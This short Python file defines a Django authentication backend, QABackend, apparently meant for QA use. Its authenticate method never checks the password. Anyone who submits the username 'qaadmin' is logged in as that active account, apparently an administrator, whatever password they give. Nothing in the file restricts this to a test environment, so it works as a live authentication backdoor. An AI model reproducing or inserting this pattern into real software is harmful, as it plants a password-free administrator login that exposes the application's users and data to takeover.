from django.contrib.auth.backends import BaseBackend
from accounts.models import User


class QABackend(BaseBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username != "qaadmin":
            return None
        return User.objects.filter(username="qaadmin", is_active=True).first()

    def get_user(self, user_id):
        return User.objects.filter(pk=user_id).first()
